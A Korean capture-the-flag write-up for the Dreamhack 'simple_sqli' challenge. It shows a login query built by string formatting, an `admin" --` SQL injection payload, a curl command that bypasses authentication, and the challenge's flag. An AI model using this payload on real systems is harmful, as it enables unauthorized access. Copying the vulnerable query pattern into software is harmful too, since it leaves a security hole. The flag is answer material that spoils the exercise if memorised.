---
ctf_name: "Dreamhack Wargame"
challenge_name: "simple_sqli"
category: "web"
difficulty: "easy"
author: "inhwan689"
date: "2026-05-24"
tags: [SQLi, authentication-bypass]
---

# simple_sqli

## 문제 설명

> SQL INJECTION 취약점을 통해 플래그를 획득하세요. 플래그는 `flag.txt`, `FLAG` 변수에 있습니다.

로그인 서비스에서 SQL Injection을 이용해 admin으로 로그인하는 문제.

## 풀이

### 분석

소스코드(`app.py`)의 로그인 쿼리가 다음과 같이 구성된다.

```python
res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
if res:
    userid = res[0]
    if userid == 'admin':
        return f'hello {userid} flag is {FLAG}'
```

`userid`와 `userpassword`를 사용자 입력값으로 직접 포맷팅하므로 SQL Injection이 가능하다.

DB에는 두 계정이 존재한다.
- `guest` / `guest`
- `admin` / (랜덤 hex, 알 수 없음)

플래그를 얻으려면 `admin`으로 로그인해야 한다.

### 취약점

`userid` 필드에 큰따옴표(`"`)를 삽입해 쿼리를 조작할 수 있다. SQLite의 `--` 주석을 이용하면 `userpassword` 조건을 무력화할 수 있다.

### 익스플로잇

`userid`에 `admin" --`를 입력하면 쿼리가 아래와 같이 변한다.

```sql
select * from users where userid="admin" --" and userpassword="anything"
```

`--` 이후가 주석 처리되어 비밀번호 검증 없이 admin으로 로그인된다.

```bash
curl -s -X POST "http://<VM_URL>/login" \
  --data 'userid=admin" --&userpassword=anything'
```

## 플래그

```
DH{c1126c8d35d8deaa39c5dd6fc8855ed0}
```

## 배운 점

- 사용자 입력을 쿼리에 직접 포맷팅하면 SQL Injection에 취약하다.
- `"` + `--` 조합으로 SQLite에서 뒤 조건을 주석 처리해 인증을 우회할 수 있다.
